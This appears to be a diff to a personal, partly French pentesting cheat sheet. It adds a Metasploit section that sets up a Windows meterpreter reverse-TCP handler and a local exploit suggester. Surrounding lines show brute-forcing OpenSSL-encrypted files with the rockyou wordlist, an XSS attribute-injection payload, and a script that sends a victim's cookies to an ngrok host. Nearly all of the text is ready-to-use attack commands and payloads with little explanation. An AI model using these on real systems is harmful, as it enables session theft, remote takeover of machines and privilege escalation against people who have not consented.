@@ -134,16 +134,31 @@ bruteforce-salted-openssl -t 6 -f ~/Téléchargements/rockyou.txt -c AES-256-CBC
 Encoder en openssl
 openssl enc -in LEFICHIERDENTREE -out LEFICHIERDESORTIE -d -AES-256-CBC -md sha256 -pass 'pass:LEPASSQUETATROUVE'
 
+
 ------------------------------------------------------------------------------------------
 				XSS
 ------------------------------------------------------------------------------------------
-
 "onfocus="alert(1)"autofocus="
 
  ----- NGROK -----
 <script>window.location.href='http://ngrok.io/?cookie='+document.cookie</script>
 						   or  v
 						      %2b
+
+------------------------------------------------------------------------------------------
+				METERPRETER
+------------------------------------------------------------------------------------------
+
+use exploit/multi/handler 			-- to handle connexions --
+set payload windows/meterpreter/reverse_tcp	-- windows handler -- 
+sessions -i 1  					-- interact with sessions --
+
+ctrl + z 					-- background the meterpreter so we can use other tools --
+use post/multi/recon/local_exploit_suggester	-- windows exploit suggester (session number need to be added to the options) --
+
+ 
+
+
 
 
 --------------------------DIVERS------------------------------
